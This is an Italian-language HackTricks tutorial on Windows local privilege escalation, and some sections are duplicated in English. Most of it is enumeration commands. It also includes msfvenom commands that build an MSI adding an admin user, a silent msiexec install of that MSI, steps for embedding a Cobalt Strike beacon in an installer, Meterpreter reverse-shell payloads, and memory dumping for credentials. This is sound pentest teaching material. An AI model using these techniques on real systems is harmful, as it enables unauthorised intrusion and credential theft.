# Windows Escalatione Locale dei Privilegi

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Il miglior strumento per cercare vettori di escalatione dei privilegi locali di Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Iniziale di Windows

### Token di Accesso

**Se non sai cosa sono i Token di Accesso di Windows, leggi la seguente pagina prima di continuare:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL - DACL/SACL/ACE

**Controlla la seguente pagina per ulteriori informazioni su ACL - DACL/SACL/ACE:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Livelli di Integrità

**Se non sai cosa sono i livelli di integrità in Windows, dovresti leggere la seguente pagina prima di continuare:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Controlli di Sicurezza di Windows

Ci sono diverse cose in Windows che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o addirittura **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** e **enumerare** tutti questi **meccanismi di difesa** prima di iniziare l'enumerazione dell'escalatione dei privilegi:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Informazioni di Sistema

### Enumerazione delle informazioni sulla versione

Verifica se la versione di Windows ha qualche vulnerabilità nota (verifica anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versione degli Exploit

Questo [sito](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza di Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza, mostrando l'**enorme superficie di attacco** che un ambiente Windows presenta.

**Sul sistema**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson incorporato)_

**Localmente con informazioni di sistema**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repository di exploit su Github:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Ci sono credenziali/informazioni sensibili salvate nelle variabili di ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Cronologia di PowerShell

PowerShell mantiene una cronologia delle righe di comando eseguite durante una sessione. Questa cronologia può essere utile per tracciare le azioni eseguite da un utente o per ripetere comandi precedenti. La cronologia di PowerShell viene memorizzata in un file di testo chiamato `ConsoleHost_history.txt`.

Per visualizzare la cronologia di PowerShell, è possibile utilizzare il cmdlet `Get-History`. Questo cmdlet restituirà un elenco numerato delle righe di comando eseguite durante la sessione corrente.

```powershell
Get-History
```

Per eseguire un comando dalla cronologia, è possibile utilizzare il cmdlet `Invoke-History` seguito dal numero corrispondente alla riga di comando desiderata.

```powershell
Invoke-History -Id <ID>
```

È anche possibile cercare nella cronologia di PowerShell utilizzando il cmdlet `Select-String`. Ad esempio, per cercare un comando specifico nella cronologia, è possibile utilizzare il seguente comando:

```powershell
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt | Select-String -Pattern "<comando>"
```

La cronologia di PowerShell può essere un'importante fonte di informazioni durante un'analisi forense o un'attività di penetration testing. Tuttavia, è importante notare che la cronologia può essere modificata o eliminata dagli utenti, quindi potrebbe non essere sempre affidabile al 100%.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di trascrizione di PowerShell

Puoi imparare come attivare questa funzionalità su [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Registrazione del modulo PowerShell

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, potrebbe non essere possibile catturare tutti i dettagli dell'esecuzione e i risultati di output.

Per abilitare questa funzionalità, seguire le istruzioni nella sezione "File di trascrizione" della documentazione, optando per **"Registrazione del modulo"** invece di **"Trascrizione di PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi dai log di PowerShell, puoi eseguire il seguente comando:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene registrata un'attività completa e un registro completo del contenuto dell'esecuzione dello script, garantendo che ogni blocco di codice venga documentato durante l'esecuzione. Questo processo preserva una traccia di audit completa di ogni attività, utile per la forense e l'analisi del comportamento maligno. Documentando tutte le attività al momento dell'esecuzione, vengono fornite informazioni dettagliate sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di registrazione per il Blocco di script possono essere trovati all'interno del Visualizzatore eventi di Windows nel percorso: **Registro applicazioni e servizi > Microsoft > Windows > PowerShell > Operativo**.\
Per visualizzare gli ultimi 20 eventi è possibile utilizzare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet

#### Proxy Settings

#### Impostazioni Proxy

Proxy settings can be used to redirect network traffic through an intermediary server. This can be useful for various purposes, such as improving security or accessing restricted content. However, misconfigured proxy settings can also introduce vulnerabilities that can be exploited by attackers.

Le impostazioni del proxy possono essere utilizzate per reindirizzare il traffico di rete attraverso un server intermedio. Ciò può essere utile per vari scopi, come migliorare la sicurezza o accedere a contenuti restritti. Tuttavia, le impostazioni del proxy mal configurate possono anche introdurre vulnerabilità che possono essere sfruttate dagli attaccanti.

To check the proxy settings on a Windows system, you can use the `netsh` command:

Per verificare le impostazioni del proxy su un sistema Windows, è possibile utilizzare il comando `netsh`:

```plaintext
netsh winhttp show proxy
```

This command will display the current proxy settings for the system.

Questo comando visualizzerà le impostazioni del proxy correnti per il sistema.

To configure proxy settings, you can use the `netsh` command as well. For example, to set a proxy server with the address `proxy.example.com` and port `8080`, you can use the following command:

Per configurare le impostazioni del proxy, è possibile utilizzare anche il comando `netsh`. Ad esempio, per impostare un server proxy con l'indirizzo `proxy.example.com` e la porta `8080`, è possibile utilizzare il seguente comando:

```plaintext
netsh winhttp set proxy proxy-server="proxy.example.com:8080"
```

Make sure to replace `proxy.example.com` and `8080` with the actual address and port of your proxy server.

Assicurarsi di sostituire `proxy.example.com` e `8080` con l'effettivo indirizzo e la porta del server proxy.

#### Firewall Settings

#### Impostazioni del firewall

Firewall settings control the incoming and outgoing network traffic on a system. By configuring firewall rules, you can allow or block specific connections based on various criteria, such as the source or destination IP address, port number, or protocol.

Le impostazioni del firewall controllano il traffico di rete in entrata e in uscita su un sistema. Configurando le regole del firewall, è possibile consentire o bloccare connessioni specifiche in base a vari criteri, come l'indirizzo IP di origine o destinazione, il numero di porta o il protocollo.

To check the firewall settings on a Windows system, you can use the `netsh` command:

Per verificare le impostazioni del firewall su un sistema Windows, è possibile utilizzare il comando `netsh`:

```plaintext
netsh advfirewall show currentprofile
```

This command will display the current firewall profile and its settings.

Questo comando visualizzerà il profilo del firewall corrente e le relative impostazioni.

To configure firewall settings, you can use the `netsh` command as well. For example, to allow incoming traffic on port `80` for the current profile, you can use the following command:

Per configurare le impostazioni del firewall, è possibile utilizzare anche il comando `netsh`. Ad esempio, per consentire il traffico in ingresso sulla porta `80` per il profilo corrente, è possibile utilizzare il seguente comando:

```plaintext
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80
```

This command will add a new firewall rule to allow incoming TCP traffic on port `80`.

Questo comando aggiungerà una nuova regola del firewall per consentire il traffico TCP in ingresso sulla porta `80`.

Make sure to adjust the parameters (`name`, `dir`, `action`, `protocol`, `localport`) according to your specific requirements.

Assicurarsi di adattare i parametri (`name`, `dir`, `action`, `protocol`, `localport`) in base alle proprie esigenze specifiche.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità

In Windows, a drive is a storage device that is assigned a letter, such as C:, D:, etc. Each drive can contain files, folders, and other data.

In Windows, un'unità è un dispositivo di archiviazione a cui viene assegnata una lettera, come ad esempio C:, D:, ecc. Ogni unità può contenere file, cartelle e altri dati.

### Drive Types

There are different types of drives in Windows, including:

- **Local Drives**: These are physical drives that are directly connected to the computer, such as hard disk drives (HDD) or solid-state drives (SSD).
- **Network Drives**: These are drives that are connected to a network and can be accessed by multiple computers.
- **Virtual Drives**: These are drives that are created by software and are not physically connected to the computer. Examples include virtual disk images or mounted ISO files.

Esistono diversi tipi di unità in Windows, tra cui:

- **Unità locali**: Sono unità fisiche che sono direttamente collegate al computer, come ad esempio i dischi rigidi (HDD) o i dischi a stato solido (SSD).
- **Unità di rete**: Sono unità che sono collegate a una rete e possono essere accessibili da più computer.
- **Unità virtuali**: Sono unità create da software e non sono fisicamente collegate al computer. Esempi includono immagini di dischi virtuali o file ISO montati.

### Drive Permissions

Each drive in Windows has its own set of permissions that determine who can access and modify the files and folders on that drive. These permissions can be set for individual users or groups.

Ogni unità in Windows ha il proprio set di autorizzazioni che determinano chi può accedere e modificare i file e le cartelle su quella unità. Queste autorizzazioni possono essere impostate per singoli utenti o gruppi.

### Drive Mapping

Drive mapping is the process of assigning a drive letter to a network drive or a shared folder. This allows the drive or folder to be accessed as if it were a local drive.

La mappatura dell'unità è il processo di assegnazione di una lettera di unità a un'unità di rete o a una cartella condivisa. Ciò consente di accedere all'unità o alla cartella come se fosse un'unità locale.

### Drive Encryption

Drive encryption is the process of converting data on a drive into a form that cannot be easily understood by unauthorized users. This helps protect sensitive information in case the drive is lost or stolen.

La crittografia dell'unità è il processo di convertire i dati su un'unità in una forma che non può essere facilmente compresa da utenti non autorizzati. Ciò aiuta a proteggere le informazioni sensibili nel caso in cui l'unità venga persa o rubata.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti utilizzando http**S** ma solo http.

Inizia verificando se la rete utilizza un aggiornamento WSUS non SSL eseguendo il seguente comando:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Se ricevi una risposta come:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` è uguale a `1`.

Allora, **è sfruttabile**. Se l'ultima voce del registro è uguale a 0, l'ingresso WSUS verrà ignorato.

Per sfruttare queste vulnerabilità è possibile utilizzare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Questi sono script di exploit weaponized MiTM per iniettare aggiornamenti "falsi" nel traffico WSUS non SSL.

Leggi la ricerca qui:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Leggi il rapporto completo qui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questa è la falla che sfrutta questo bug:

> Se abbiamo il potere di modificare il nostro proxy utente locale e Windows Updates utilizza il proxy configurato nelle impostazioni di Internet Explorer, quindi abbiamo il potere di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro stesso traffico e eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS utilizza le impostazioni dell'utente corrente, utilizzerà anche il suo archivio di certificati. Se generiamo un certificato autofirmato per il nome host WSUS e aggiungiamo questo certificato nell'archivio di certificati dell'utente corrente, saremo in grado di intercettare sia il traffico WSUS HTTP che HTTPS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è affidabile per l'utente e ha il nome host corretto, verrà accettato dal servizio.

È possibile sfruttare questa vulnerabilità utilizzando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta che sarà liberato).

## KrbRelayUp

Esiste una vulnerabilità di **elevazione dei privilegi locali** in ambienti Windows **domain** in determinate condizioni. Queste condizioni includono ambienti in cui **la firma LDAP non è obbligatoria**, gli utenti possiedono i diritti di configurare **Resource-Based Constrained Delegation (RBCD)** e la capacità per gli utenti di creare computer all'interno del dominio. È importante notare che questi **requisiti** sono soddisfatti utilizzando le **impostazioni predefinite**.

Trova l'exploit in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per ulteriori informazioni sul flusso dell'attacco, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** questi 2 registri sono **abilitati** (il valore è **0x1**), allora gli utenti di qualsiasi privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payload di Metasploit

Metasploit fornisce una vasta gamma di payload che possono essere utilizzati per sfruttare le vulnerabilità e ottenere l'escalation dei privilegi locali su sistemi Windows. Di seguito sono elencati alcuni dei payload più comuni:

- **windows/meterpreter/reverse_tcp**: Questo payload consente di stabilire una connessione TCP inversa con il sistema di destinazione e fornire un'interfaccia di shell interattiva.
- **windows/meterpreter/reverse_http**: Simile al payload reverse_tcp, ma utilizza il protocollo HTTP per la comunicazione.
- **windows/meterpreter/reverse_https**: Simile al payload reverse_tcp, ma utilizza il protocollo HTTPS per la comunicazione, offrendo una maggiore sicurezza.
- **windows/meterpreter/reverse_dns**: Questo payload utilizza il protocollo DNS per stabilire una connessione inversa con il sistema di destinazione.
- **windows/meterpreter/reverse_winhttp**: Simile al payload reverse_tcp, ma utilizza il protocollo WinHTTP per la comunicazione.

Questi sono solo alcuni esempi di payload disponibili in Metasploit. È possibile selezionare il payload più adatto in base alle esigenze specifiche del proprio attacco.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione di meterpreter, puoi automatizzare questa tecnica utilizzando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilizza il comando `Write-UserAddMSI` di PowerUP per creare all'interno della directory corrente un file binario MSI di Windows per l'escalation dei privilegi. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GUI):
```
Write-UserAddMSI
```
Basta eseguire il file binario creato per ottenere privilegi elevati.

### MSI Wrapper

Leggi questo tutorial per imparare come creare un wrapper MSI utilizzando questi strumenti. Nota che puoi incapsulare un file "**.bat**" se desideri solo eseguire comandi da riga di comando.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Creare MSI con WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Creare MSI con Visual Studio

* **Genera** con Cobalt Strike o Metasploit un **nuovo payload TCP Windows EXE** in `C:\privesc\beacon.exe`
* Apri **Visual Studio**, seleziona **Crea un nuovo progetto** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca su **Avanti**.
* Dai un nome al progetto, come **AlwaysPrivesc**, utilizza **`C:\privesc`** come posizione, seleziona **posiziona soluzione e progetto nella stessa directory** e clicca su **Crea**.
* Continua a cliccare su **Avanti** fino ad arrivare al passaggio 3 di 4 (scegli i file da includere). Clicca su **Aggiungi** e seleziona il payload Beacon appena generato. Poi clicca su **Fine**.
* Evidenzia il progetto **AlwaysPrivesc** nell'**Esplora soluzioni** e nelle **Proprietà**, cambia **TargetPlatform** da **x86** a **x64**.
* Ci sono altre proprietà che puoi modificare, come l'**Autore** e il **Produttore**, che possono rendere l'app installata più legittima.
* Fai clic con il pulsante destro del mouse sul progetto e seleziona **Visualizza > Azioni personalizzate**.
* Fai clic con il pulsante destro del mouse su **Installazione** e seleziona **Aggiungi azione personalizzata**.
* Fai doppio clic su **Cartella applicazioni**, seleziona il tuo file **beacon.exe** e clicca su **OK**. In questo modo il payload Beacon verrà eseguito non appena viene avviato l'installer.
* Nelle **Proprietà azione personalizzata**, cambia **Run64Bit** in **True**.
* Infine, **compila** il progetto.
* Se viene mostrato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di impostare la piattaforma su x64.

### Installazione MSI

Per eseguire l'**installazione** del file `.msi` maligno in **background**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi utilizzare: _exploit/windows/local/always\_install\_elevated_

## Antivirus e Rilevatori

### Impostazioni di Audit

Queste impostazioni decidono cosa viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, è interessante sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è progettato per la **gestione delle password dell'amministratore locale**, garantendo che ogni password sia **unica, randomizzata e regolarmente aggiornata** sui computer connessi a un dominio. Queste password vengono memorizzate in modo sicuro all'interno di Active Directory e possono essere accessibili solo dagli utenti a cui sono state concesse le autorizzazioni sufficienti tramite ACL, consentendo loro di visualizzare le password dell'amministratore locale se autorizzati.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Se attivo, **le password in chiaro vengono memorizzate in LSASS** (Local Security Authority Subsystem Service).\
[**Ulteriori informazioni su WDigest in questa pagina**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protezione LSA

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per l'Autorità di Sicurezza Locale (LSA) per **bloccare** i tentativi di processi non fidati di **leggere la sua memoria** o iniettare codice, aumentando ulteriormente la sicurezza del sistema.\
[**Ulteriori informazioni sulla Protezione LSA qui**](../stealing-credentials/credentials-protections.md#protezione-lsa).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo da minacce come gli attacchi pass-the-hash.
[**Maggiori informazioni su Credentials Guard qui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenziali memorizzate nella cache

Le **credenziali di dominio** vengono autenticate dall'**Autorità di sicurezza locale** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un pacchetto di sicurezza registrato, di solito vengono create le credenziali di dominio per l'utente.\
[**Ulteriori informazioni sulle credenziali memorizzate nella cache qui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti e Gruppi

### Enumerare Utenti e Gruppi

Dovresti verificare se alcuni dei gruppi a cui appartieni hanno permessi interessanti.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a un gruppo privilegiato potresti essere in grado di ottenere privilegi elevati**. Scopri di più sui gruppi privilegiati e su come sfruttarli per ottenere privilegi elevati qui:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipolazione dei token

**Scopri di più** su cosa è un **token** in questa pagina: [**Token di Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Consulta la seguente pagina per **scoprire informazioni sui token interessanti** e su come sfruttarli:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Utenti loggati / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home

In Windows, each user has a home folder that contains their personal files and settings. These folders are located in the `C:\Users` directory and are named after the user's username. The home folder is a common target for privilege escalation because it often contains sensitive information and configuration files that can be leveraged to gain higher privileges.

Nelle versioni di Windows, ogni utente ha una cartella home che contiene i suoi file personali e le impostazioni. Queste cartelle si trovano nella directory `C:\Users` e sono denominate con il nome utente dell'utente. La cartella home è un obiettivo comune per l'escalation dei privilegi perché spesso contiene informazioni sensibili e file di configurazione che possono essere sfruttati per ottenere privilegi più elevati.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Politica delle password

La politica delle password è un insieme di regole che definiscono i requisiti per la creazione e l'utilizzo delle password. Una password sicura è essenziale per proteggere i dati e prevenire accessi non autorizzati. Di seguito sono riportate alcune linee guida comuni per una politica delle password robusta:

- **Complessità**: Le password dovrebbero essere complesse e difficili da indovinare. Devono contenere una combinazione di lettere maiuscole e minuscole, numeri e caratteri speciali.

- **Lunghezza**: Le password dovrebbero essere lunghe almeno 8 caratteri. Più lunga è la password, più difficile sarà da indovinare.

- **Cambiamenti regolari**: Le password dovrebbero essere cambiate regolarmente, ad esempio ogni 90 giorni. Questo aiuta a prevenire l'utilizzo di password compromesse.

- **Non riutilizzare**: Le password non dovrebbero essere riutilizzate per diversi account. Ogni account dovrebbe avere una password unica.

- **Blocco degli account**: Dopo un certo numero di tentativi falliti di accesso, l'account dovrebbe essere bloccato per un determinato periodo di tempo. Questo aiuta a prevenire attacchi di forza bruta.

- **Autenticazione a due fattori**: L'autenticazione a due fattori aggiunge un ulteriore livello di sicurezza richiedendo un secondo metodo di verifica, come un codice inviato via SMS o un'applicazione di autenticazione.

Seguire una politica delle password rigorosa può contribuire a proteggere i sistemi e i dati da accessi non autorizzati.
```bash
net accounts
```
### Ottenere il contenuto degli appunti

Per ottenere il contenuto degli appunti di un utente, è possibile utilizzare il comando `Get-Clipboard` in PowerShell. Questo comando restituirà il contenuto degli appunti come output. 

```powershell
Get-Clipboard
```

È importante notare che questo comando funziona solo se l'utente ha effettuato una copia di testo o file negli appunti. Se gli appunti sono vuoti o non contengono dati copiati, il comando non restituirà alcun output.
```bash
powershell -command "Get-Clipboard"
```
## Esecuzione dei processi

### Permessi di file e cartella

Innanzitutto, elencare i processi **verificando la presenza di password nella riga di comando del processo**.\
Verificare se è possibile **sovrascrivere un binario in esecuzione** o se si hanno i permessi di scrittura della cartella del binario per sfruttare possibili attacchi di [**DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Verifica sempre la presenza di [**debugger electron/cef/chromium in esecuzione**, potresti sfruttarlo per ottenere privilegi elevati](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verifica i permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verifica dei permessi delle cartelle dei binari dei processi (DLL Hijacking)**

Per identificare potenziali vulnerabilità di DLL Hijacking, è necessario controllare i permessi delle cartelle dei binari dei processi. Questo può essere fatto utilizzando i seguenti passaggi:

1. Identifica i processi in esecuzione sul sistema.
2. Ottieni il percorso del binario di ogni processo.
3. Verifica i permessi della cartella in cui si trova il binario.
4. Assicurati che solo gli utenti autorizzati abbiano i permessi di scrittura nella cartella.

Se si trovano cartelle con permessi di scrittura per utenti non autorizzati, potrebbe essere possibile sfruttare una vulnerabilità di DLL Hijacking per ottenere privilegi elevati.
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Estrazione delle password dalla memoria

È possibile creare un dump della memoria di un processo in esecuzione utilizzando **procdump** di sysinternals. Servizi come FTP hanno le **credenziali in chiaro nella memoria**, prova a fare il dump della memoria e leggere le credenziali.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI non sicure

**Le applicazioni che vengono eseguite come SYSTEM potrebbero consentire a un utente di avviare un prompt dei comandi o di navigare nelle directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "prompt dei comandi", fai clic su "Fai clic per aprire il prompt dei comandi"

## Servizi

Ottieni un elenco dei servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

